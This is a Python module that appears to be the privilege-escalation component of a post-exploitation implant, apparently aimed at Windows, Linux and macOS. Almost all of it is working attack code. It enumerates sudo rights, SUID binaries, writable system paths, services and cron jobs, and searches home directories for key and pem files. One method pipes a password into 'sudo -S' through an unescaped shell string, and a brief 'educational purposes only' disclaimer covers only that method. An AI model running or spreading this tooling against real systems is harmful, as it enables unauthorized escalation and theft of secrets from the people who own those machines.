################################################
# Privilege Escalation Feature Module          #
# Attempts to elevate privileges               #
################################################

import subprocess
import os
import platform
import sys


class PrivilegeEscalation:
    """
    Attempts to escalate privileges on the target system.
    Different techniques for Windows, Linux, and macOS.
    """
    
    def __init__(self):
        self.system = platform.system()
        self.is_admin = self.check_privileges()
    
    def check_privileges(self):
        """Check if the current process has elevated privileges"""
        try:
            if self.system == 'Windows':
                import ctypes
                return ctypes.windll.shell32.IsUserAnAdmin() != 0
            else:
                # Unix-based systems (Linux, macOS)
                return os.geteuid() == 0
        except:
            return False
    
    def get_status(self):
        """Get current privilege status"""
        status = {
            'system': self.system,
            'is_admin': self.is_admin,
            'user': os.getenv('USER') or os.getenv('USERNAME'),
            'uid': os.getuid() if hasattr(os, 'getuid') else 'N/A',
            'groups': self.get_user_groups()
        }
        return status
    
    def get_user_groups(self):
        """Get user groups"""
        try:
            if self.system == 'Windows':
                result = subprocess.check_output('whoami /groups', shell=True).decode()
                return result
            else:
                result = subprocess.check_output('groups', shell=True).decode()
                return result
        except:
            return "Unable to retrieve groups"
    
    def find_sudo_opportunities(self):
        """Find potential sudo opportunities on Linux/macOS"""
        if self.system in ['Linux', 'Darwin']:
            try:
                # Check sudo privileges
                result = subprocess.check_output('sudo -l', shell=True, stderr=subprocess.PIPE).decode()
                return result
            except:
                return "No sudo privileges or unable to check"
        return "Not applicable for this system"
    
    def check_suid_binaries(self):
        """Find SUID binaries on Unix systems"""
        if self.system in ['Linux', 'Darwin']:
            try:
                # Find SUID binaries (common privilege escalation vector)
                cmd = 'find / -perm -4000 -type f 2>/dev/null'
                result = subprocess.check_output(cmd, shell=True, timeout=10).decode()
                return result if result else "No SUID binaries found"
            except subprocess.TimeoutExpired:
                return "Search timed out (too many files)"
            except:
                return "Unable to search for SUID binaries"
        return "Not applicable for this system"
    
    def check_writable_paths(self):
        """Check for writable paths in system directories"""
        if self.system in ['Linux', 'Darwin']:
            try:
                # Check writable directories in PATH
                cmd = 'find /usr/local/bin /usr/bin /bin -writable -type d 2>/dev/null'
                result = subprocess.check_output(cmd, shell=True, timeout=5).decode()
                return result if result else "No writable paths found"
            except:
                return "Unable to check writable paths"
        return "Not applicable for this system"
    
    def attempt_sudo_exploit(self, password=None):
        """
        Attempt to use sudo with provided password.
        WARNING: This is for educational purposes only!
        """
        if self.system not in ['Linux', 'Darwin']:
            return "This method only works on Unix-based systems"
        
        if not password:
            return "Password required for sudo escalation"
        
        try:
            # Try to execute a command with sudo
            cmd = f'echo {password} | sudo -S whoami'
            result = subprocess.check_output(cmd, shell=True, stderr=subprocess.PIPE).decode()
            return f"Sudo access gained: {result}"
        except:
            return "Failed to escalate privileges with provided password"
    
    def check_kernel_version(self):
        """Check kernel version for known vulnerabilities"""
        try:
            if self.system == 'Linux':
                result = subprocess.check_output('uname -a', shell=True).decode()
                return f"Kernel Info: {result}\nNote: Check exploit-db for kernel exploits"
            elif self.system == 'Darwin':
                result = subprocess.check_output('sw_vers', shell=True).decode()
                return f"macOS Version: {result}"
            elif self.system == 'Windows':
                result = subprocess.check_output('systeminfo | findstr /B /C:"OS"', shell=True).decode()
                return result
        except:
            return "Unable to retrieve system information"
    
    def enumerate_services(self):
        """Enumerate running services (potential attack vectors)"""
        try:
            if self.system == 'Windows':
                result = subprocess.check_output('sc query state= all', shell=True).decode()
                return result[:2000]  # Limit output
            elif self.system == 'Linux':
                result = subprocess.check_output('systemctl list-units --type=service --state=running', shell=True).decode()
                return result[:2000]
            elif self.system == 'Darwin':
                result = subprocess.check_output('launchctl list', shell=True).decode()
                return result[:2000]
        except:
            return "Unable to enumerate services"
    
    def check_scheduled_tasks(self):
        """Check scheduled tasks/cron jobs"""
        try:
            if self.system == 'Windows':
                result = subprocess.check_output('schtasks /query /fo LIST', shell=True).decode()
                return result[:2000]
            elif self.system in ['Linux', 'Darwin']:
                result = subprocess.check_output('crontab -l 2>/dev/null', shell=True).decode()
                if not result:
                    result = "No crontab for current user"
                return result
        except:
            return "Unable to check scheduled tasks"
    
    def find_sensitive_files(self):
        """Search for potentially sensitive files"""
        sensitive_patterns = [
            '*.txt', '*.conf', '*.config', '*.log', 
            '*.bak', '*.old', '*.key', '*.pem'
        ]
        
        try:
            if self.system == 'Windows':
                # Search in user directory
                user_dir = os.path.expanduser('~')
                cmd = f'dir /s /b "{user_dir}\\*.txt" "{user_dir}\\*.config" 2>nul'
                result = subprocess.check_output(cmd, shell=True, timeout=5).decode()
            else:
                # Search in home directory
                home = os.path.expanduser('~')
                cmd = f'find {home} -name "*.txt" -o -name "*.conf" -o -name "*.key" 2>/dev/null | head -50'
                result = subprocess.check_output(cmd, shell=True, timeout=5).decode()
            
            return result if result else "No sensitive files found"
        except subprocess.TimeoutExpired:
            return "Search timed out"
        except:
            return "Unable to search for sensitive files"


def get_privilege_info():
    """Quick function to get privilege information"""
    pe = PrivilegeEscalation()
    return pe.get_status()
